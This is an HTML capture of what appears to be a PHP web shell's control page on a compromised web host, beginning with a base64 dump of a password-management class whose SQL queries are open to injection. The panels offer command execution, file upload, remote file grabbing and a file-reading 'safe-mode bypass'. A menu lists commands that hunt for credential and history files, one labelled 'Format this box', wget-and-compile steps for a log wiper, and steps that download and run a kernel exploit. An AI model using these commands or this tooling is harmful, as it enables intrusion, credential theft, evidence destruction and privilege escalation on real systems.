cmQoJHN0clBhc3N3b3JkKTsKCQkJCgkJCWlmKCRpbnRQYXNzQ291bnQgIT09IGZhbHNlKXsKCQkJCQoJCQkJaWYoaXNfbnVsbCgkaW50TXVsdGlwbGVVc2VzKSl7CgkJCQkJCgkJCQkJJGludE11bHRpcGxlVXNlcyA9IDE7CgkJCQl9CgkJCQkKCQkJCWlmKCRpbnRNdWx0aXBsZVVzZXMgPT0gOTk5IHx8ICRpbnRNdWx0aXBsZVVzZXMgPiAkaW50UGFzc0NvdW50KXsKCQkJCQkKCQkJCQkkYmxVcGRhdGVQYXNzd29yZFJlY29yZCA9IHRydWU7CgkJCQl9ZWxzZXsKCQkJCQkKCQkJCQkkYmxVcGRhdGVQYXNzd29yZFJlY29yZCA9IGZhbHNlOwoJCQkJfQoJCQkJCgkJCQkvL0lmIGNvbmZpcm1hdGlvbiByZXF1aXJlZCBhbmQgbm9uIGhhcyBiZWVuIGdpdmVuIHRoZW4gZG9udCBhbGxvdyB0aGUgdXNlCgkJCQlpZigkYmxSZXF1aXJlQ29uZmlybSAmJiAhJHRoaXMtPkNvbmZpcm1lZFBhc3N3b3JkKCRzdHJQYXNzd29yZCkpewoJCQkJCQoJCQkJCSRibFVwZGF0ZVBhc3N3b3JkUmVjb3JkID0gZmFsc2U7CgkJCQl9CgkJCQkKCQkJCWlmKCRibFVwZGF0ZVBhc3N3b3JkUmVjb3JkKXsKCQkJCQoJCQkJCSRzdHJFeHRyYVdoZXJlQ2xhdXNlID0gIiI7CgkJCQoJCQkJCWlmKCFpc19udWxsKCRzdHJVc2VybmFtZSkgJiYgJHN0clVzZXJuYW1lICE9ICIiKXsKCQkJCQkJJHN0ckV4dHJhV2hlcmVDbGF1c2UgLj0gIkFORCBgdXNlcm5hbWVgID0gJ3skc3RyVXNlcm5hbWV9JyI7CgkJCQkJfQoJCQkJCQoJCQkJCWlmKCFpc19udWxsKCRzdHJSZWZlcmVySUQpICYmICRzdHJSZWZlcmVySUQgIT0gIiIpewoJCQkJCQkkc3RyRXh0cmFXaGVyZUNsYXVzZSAuPSAiQU5EIGByZWZlcmVyYCA9ICd7JHN0clJlZmVyZXJJRH0nIjsKCQkJCQl9CgkJCQkJCgkJCQkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byB1c2UgYSBwYXNzd29yZCBpbiB0aGUgcGFzc3dvcmQgZGF0YWJhc2UgKi8KCQkJCQkkc3RyU1FMID0gIlVQREFURSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQkJCQkgIFNFVCBgc3RhdHVzYCA9IGBzdGF0dXNgICsgMQoJCQkJCQkJCVdIRVJFIGBwYXNzd29yZGAgPSAneyRzdHJQYXNzd29yZH0nCgkJCQkJCQkJeyRzdHJFeHRyYVdoZXJlQ2xhdXNlfQoJCQkJCQkJCUxJTUlUIDEiOwoJCQkJCQoJCQkJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+QWZmUm93cygpKXsKCQkJCQoJCQkJCQkkYmxTdWNjZXNzZnVseVJlZGVtZWQgPSB0cnVlOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQoJCX0KCQkKCQlyZXR1cm4gJGJsU3VjY2Vzc2Z1bHlSZWRlbWVkOwoJfQoJCgkvKioKCSAqIEBicmllZiBDaGVja3MgdGhlIHBhc3N3b3JkIGlzIG5vdCBibGFuayBhbmQgdGhlIHBhc3N3b3JkIGlzIGF0IGxlYXN0IDYgY2hhcnMgbG9uZwoJICoKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clBhc3N3b3JkCgkgKiBAcmV0dXJuIGJvb2xlYW4KCSAqLwoJZnVuY3Rpb24gQ2hlY2tQYXNzd29yZCgkc3RyUGFzc3dvcmQpewoJCQoJCSRibFBhc3N3b3JkR29vZCA9IGZhbHNlOwoJCQoJCWlmKCFpc19udWxsKCRzdHJQYXNzd29yZCkgJiYgJHN0clBhc3N3b3JkICE9ICIiKXsKCQkJCgkJCS8qKiBAbm90ZSBQYXNzd29yZHMgbXVzdCBhdGxlYXN0IDYgY2hhcnMgbG9uZyAqKi8KCQkJaWYoc3RybGVuKCRzdHJQYXNzd29yZCkgPiA1KXsKCQkJCgkJCQkkYmxQYXNzd29yZEdvb2QgPSB0cnVlOwoJCQl9CgkJfQoJCQoJCXJldHVybiAkYmxQYXNzd29yZEdvb2Q7Cgl9CgkKCWZ1bmN0aW9uIENvbmZpcm1lZFBhc3N3b3JkKCRzdHJQYXNzd29yZCl7CgkJCgkJJGJsQ29uZmlybWVkID0gZmFsc2U7CgkJCgkJJHRoaXMtPkRhdGFiYXNlT2JqZWN0KCk7CgkJCgkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byBnZXQgdGhlIGRldGFpbHMgb2YgYSBwYXNzd29yZCBpbiB0aGUgcGFzc3dvcmQgZGF0YWJhc2UgKi8KCQkkc3RyU1FMID0gIlNFTEVDVCAqCgkJCQkJIEZST00gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHN0clBhc3N3b3JkfScKCQkJCQkgIEFORCBgY29uZmlybWVkYCA9ICcxJwoJCQkJCUxJTUlUIDEiOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCgkJCSRibENvbmZpcm1lZCA9IHRydWU7CgkJfQoJCQoJCXJldHVybiAkYmxDb25maXJtZWQ7Cgl9CgkKCS8qKgoJICogQGJyaWVmIEdldCBhbGwgZGF0YSByZWxhdGVkIHRvIHRoZSBwYXNzd29yZCBmcm9tIHRoZSBkYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gR2V0UGFzc3dvcmREYXRhKCRzdHJQYXNzd29yZCl7CgkJCgkJJHRoaXMtPkRhdGFiYXNlT2JqZWN0KCk7CgkJCgkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byBnZXQgdGhlIGRldGFpbHMgb2YgYSBwYXNzd29yZCBpbiB0aGUgcGFzc3dvcmQgZGF0YWJhc2UgKi8KCQkkc3RyU1FMID0gIlNFTEVDVCAqCgkJCQkJIEZST00gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHN0clBhc3N3b3JkfScKCQkJCQlMSU1JVCAxIjsKCQkKCQlpZigkdGhpcy0+UXVlcnkoJHN0clNRTCkgJiYgJHRoaXMtPk51bVJvd3MoKSl7CgkJCQoJCQkkYXJyUGFzc3dvcmREYXRhT3V0ID0gJHRoaXMtPkdldEFycmF5KCk7CgoJCX1lbHNlewoJCQkKCQkJJGFyclBhc3N3b3JkRGF0YU91dCA9IG51bGw7CgkJfQoJCQoJCXJldHVybiAkYXJyUGFzc3dvcmREYXRhT3V0OwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byBydW4gYSBTUUwgcXVlcnkgb24gdGhlIGNsaWVudHMgZGF0YWJhc2UKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clNRTAoJICogQHJldHVybiBib29sZWFuIFJldHVybnMgc3RhdHVzIG9mIHRoZSBxdWVyeQoJICovCglmdW5jdGlvbiBRdWVyeSgkc3RyU1FMID0gbnVsbCl7CgkJCgkJJGJsUXVlcnlSdW4gPSBmYWxzZTsKCQkKCQkkdGhpcy0+RGF0YWJhc2VPYmplY3QoKTsKCQkKCQlpZighaXNfbnVsbCgkc3RyU1FMKSB8fCAkc3RyU1FMICE9ICIiKXsKCQkJCgkJCSRibFF1ZXJ5UnVuID0gdHJ1ZTsKCQkJCgkJCSR0aGlzLT5yZXNRdWVyeVJlc3VsdCA9IG15c3FsX3F1ZXJ5KCRzdHJTUUwsJHRoaXMtPnJlc0RiKTsKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDExJyAqLwoJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAxMSIpOwoJCX0KCQkKCQlyZXR1cm4gJGJsUXVlcnlSdW4gPSB0cnVlOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byByZXR1cm4gYSBmdWxsIGFycmF5IGNvbnRhaW5pbmcgdGhlIHJlY29yZCBzZXQgZmlsbGVkIGZyb20gdGhlIGxhc3QgcXVlcnkKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqIEByZXR1cm4gYXJyYXkgUmV0dXJucyBhbiBhcnJheSBjb250YWluaW5nIHRoZSByZXN1bHRzIG9mIHRoZSBsYXN0IHF1ZXJ5CgkgKi8KCWZ1bmN0aW9uIEdldEFycmF5KCl7CgkJCgkJJGFyclJlc3VsdHMgPSB0cnVlOwoJCQoJCWlmKG15c3FsX251bV9yb3dzKCR0aGlzLT5yZXNRdWVyeVJlc3VsdCkpewoJCQkKICAJCQkkYXJyUmVzdWx0cyA9IG15c3FsX2ZldGNoX2FycmF5KCR0aGlzLT5yZXNRdWVyeVJlc3VsdCwgTVlTUUxfQVNTT0MpOwogIAkJCW15c3FsX2ZyZWVfcmVzdWx0KCR0aGlzLT5yZXNRdWVyeVJlc3VsdCk7CiAgCQl9CgkJCgkJcmV0dXJuICRhcnJSZXN1bHRzOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byBjaGVjayBpZiBhbnkgcmVjb3JkcyB3ZXJlIGZvdW5kIGJ5IHRoZSBsYXN0IHF1ZXJ5CgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKiBAcmV0dXJuIGludGVnZXIgUmV0dXJucyB0aGUgbnVtYmVyIG9mIHJlY29yZHMgZm91bmQKCSAqLwoJZnVuY3Rpb24gTnVtUm93cygpewoJCQoJCSRpbnRTdGF0dXMgPSBmYWxzZTsKCQkKCQlpZighaXNfbnVsbCgkdGhpcy0+cmVzUXVlcnlSZXN1bHQpKXsKCQkKCQkJaWYobXlzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlc1F1ZXJ5UmVzdWx0KSA+IDApewoJCQkJCgkJCQkkaW50U3RhdHVzID0gbXlzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlc1F1ZXJ5UmVzdWx0KTsKCQkJfQoJCX0KCQkKCQlyZXR1cm4gJGludFN0YXR1czsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQSBtZXRob2QgdG8gY2hlY2sgaWYgdGhlcmUgd2FzIGFueSBlZmZlY3RlZCBkYXRhYmFzZSByZWNvcmRzIGZvcm0gdGhlIGxhc3QgdXBkYXRlIHF1ZXJ5CgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKiBAcmV0dXJuIGludGVnZXIgUmV0dXJucyB0aGUgYW1vdW50IG9mIGFmZmVjdGVkIHJvd3MKCSAqLwoJZnVuY3Rpb24gQWZmUm93cygpewoJCQoJCSRpbnRBZmZlY3RlZFJvd3MgPSBmYWxzZTsKCQkKCQlpZihteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5yZXNEYikgPiAwKXsKCQkJCgkJCSRpbnRBZmZlY3RlZFJvd3MgPSBteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5yZXNEYik7CgkJfQoJCQoJCXJldHVybiAkaW50QWZmZWN0ZWRSb3dzOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byBnZXQgdGhlIGluc2VydCBJRCBvZiB0aGUgbGFzdCByZWNvcmQgdG8gYmUgYWRkZWQgdG8gdGhlIGRhdGFiYXNlCgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKiBAcmV0dXJuIGludGVnZXIgUmV0dXJucyB0aGUgbGFzdCBpbnNlcnQgSUQKCSAqLwoJZnVuY3Rpb24gSW5zSWQoKXsKCQkKCQkkaW50SW5zZXJ0SUQgPSBmYWxzZTsKCQkKCQlpZihteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5yZXNEYikgPiAwKXsKCQkJCgkJCSRpbnRJbnNlcnRJRCA9IG15c3FsX2luc2VydF9pZCgkdGhpcy0+cmVzRGIpOwoJCX0KCQkKCQlyZXR1cm4gJGludEluc2VydElEOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIE1ldGhvZCB0byBpbml0aWF0ZSBhIGNvbm5lY3Rpb24gdG8gdGhlIGNsaWVudHMgZGF0YWJhc2Ugd2hlbiByZXF1aXJlZAoJICogQHVzZXMgRGF0YWJhc2UKCSAqIEBub3RlIFVzZXMgdGhlIGNvbm5lY3Rpb24gZGV0YWlscyBmb3VuZCBpbiB0aGUgJ0NsaWVudENvbmZpZy5waHAnIGZpbGUKCSAqIAoJICovCglmdW5jdGlvbiBEYXRhYmFzZU9iamVjdCgpewoJCQoJCWlmKCFpc19hcnJheSgkdGhpcy0+YXJyQ29uZmlnRGF0YSkpewoJCQkKCQkJJHRoaXMtPkdldENvbmZpZ0RhdGEoKTsKCQl9CgkJCgkJaWYoIWlzX3Jlc291cmNlKCR0aGlzLT5yZXNEYikpewoJCQoJCQkvKiogQG5vdGUgR2V0IGEgY29ubmVjdGlvbiB0byB0aGUgZGF0YWJhc2UgKi8KCQkJJHRoaXMtPnJlc0RiID0gbXlzcWxfY29ubmVjdCgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGJfaG9zdCddLCR0aGlzLT5hcnJDb25maWdEYXRhWydkYl91c2VybmFtZSddLCR0aGlzLT5hcnJDb25maWdEYXRhWydkYl9wYXNzd29yZCddKTsKCQkJCgkJCW15c3FsX3NlbGVjdF9kYigkdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXSwkdGhpcy0+cmVzRGIpOwoJCQkKCQkJaWYoIWlzX3Jlc291cmNlKCR0aGlzLT5yZXNEYikpewoJCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDAxJyAqLwoJCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDEiKTsKCQkJfQoJCX0KCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IHRoZSBjb25maWcgZGF0YSB0byBhbGxvdyBjb25uZWN0aW9uIHRvIHRoZSBkYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gR2V0Q29uZmlnRGF0YSgpewoJCQoJCWluY2x1ZGVfb25jZSgnQ2xpZW50Q29uZmlnLnBocCcpOwoJCQkKCQkkdGhpcy0+YXJyQ29uZmlnRGF0YSA9ICRhcnJDbGllbnREYXRhOwoJfQoJCgkvKioKCSAqIEBicmllZiBFbmQgdGhlIGN1cnJlbnQgY29ubmVjdGlvbiB0byB0aGUgZGF0YWJhc2UKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiBAbm90ZSBNYWtlcyBzdXJlIHRoZXJlIGlzIG5ldmVyIHRvIG1hbnkgY29ubmVjdGlvbnMgdG8gdGhlIGRhdGFiYXNlCgkgKiAKCSAqLwoJZnVuY3Rpb24gRW5kU2Vzc2lvbigpewoJCQoJCWlmKGlzX3Jlc291cmNlKCR0aGlzLT5yZXNEYikpewoJCQoJCQlteXNxbF9jbG9zZSgkdGhpcy0+cmVzRGIpOwoJCX0KCX0KCQoJLyoqCgkgKiBAYnJpZWYgU2VuZHMgdGhlIHN1Y2Nlc3NmdWwgcmVzcG9uc2UgYmFjayB0byB0eHROYXRpb25zIHNlcnZlcgoJICogQG5vdGUgQWNrbm93bGVkZ2VtZW50IGlzIHJlcXVpcmVkIHNvIHdlIGNhbiBmdWxseSBzdXBwb3J0IGFuZCBoZWxwIG1haW50YWluIGEgd29ya2luZyBzeXN0ZW0gb3IgY29tbXVuaWNhdGlvbgoJICoKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clN1Y2Nlc3NNZXNzYWdlCgkgKiBAcGFyYW0gYm9vbGVhbiAkYmxQYXNzd29yZENvdW50CgkgKi8KCWZ1bmN0aW9uIFNjcmlwdFN1Y2Nlc3MoJHN0clN1Y2Nlc3NNZXNzYWdlID0gbnVsbCwgJGJsUGFzc3dvcmRDb3VudCA9IHRydWUpewoKCQkkc3RyQWRkaXRvbmFsRGF0YSA9ICR0aGlzLT5Qcm9jZXNzQWRkaXRpb25hbERhdGEoKTsKCQkKCQkkc3RyQWRkaXRvbmFsRGF0YSAuPSAkdGhpcy0+UHJvY2Vzc1N5c3RlbUluZm9ybWF0aW9uKCRibFBhc3N3b3JkQ291bnQpOwoJCQoJCSR0aGlzLT5FbmRTZXNzaW9uKCk7CgkJCgkJaGVhZGVyKCJIVFRQLzEuMSAyMDAgT0siKTsKCQkKCQlkaWUoIjxyZXNwb25zZT57JHN0clN1Y2Nlc3NNZXNzYWdlfTwvcmVzcG9uc2U+XG57JHN0ckFkZGl0b25hbERhdGF9Iik7Cgl9CgkKCS8qKgoJICogQGJyaWVmIFNlbmRzIHRoZSBlcnJvciByZXNwb25zZSBiYWNrIHRvIHR4dE5hdGlvbnMgc2VydmVyCgkgKiBAbm90ZSBBY2tub3dsZWRnZW1lbnQgaXMgcmVxdWlyZWQgc28gd2UgY2FuIGZ1bGx5IHN1cHBvcnQgYW5kIGhlbHAgbWFpbnRhaW4gYSB3b3JraW5nIHN5c3RlbSBvciBjb21tdW5pY2F0aW9uCgkgKgoJICogQHBhcmFtIHN0cmluZyAkc3RyU3VjY2Vzc01lc3NhZ2UKCSAqIEBwYXJhbSBib29sZWFuICRibFBhc3N3b3JkQ291bnQKCSAqLwoJZnVuY3Rpb24gU2NyaXB0RXJyb3IoJHN0ckVycm9yTWVzc2FnZSA9IG51bGwpewoKCQkkc3RyQWRkaXRvbmFsRGF0YSA9ICR0aGlzLT5Qcm9jZXNzQWRkaXRpb25hbERhdGEoKTsKCQkKCQkkc3RyQWRkaXRvbmFsRGF0YSAuPSAkdGhpcy0+UHJvY2Vzc1N5c3RlbUluZm9ybWF0aW9uKCk7CgkJCgkJJHRoaXMtPkVuZFNlc3Npb24oKTsKCQkKCQloZWFkZXIoIkhUVFAvMS4xIDIwMCBPSyIpOwoJCQoJCWRpZSgiPGVycm9yPnskc3RyRXJyb3JNZXNzYWdlfTwvZXJyb3I+XG57JHN0ckFkZGl0b25hbERhdGF9Iik7Cgl9CgkKfQoKPz4=</textarea><br><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&fullhexdump=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Full</a>] [<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Preview</a>]<br><b>Base64: </b>",
            "<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Encode</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=2&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">+chunk</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=3&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">+chunk+quotes</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=4&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Decode</a>]&nbsp;</nobr>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
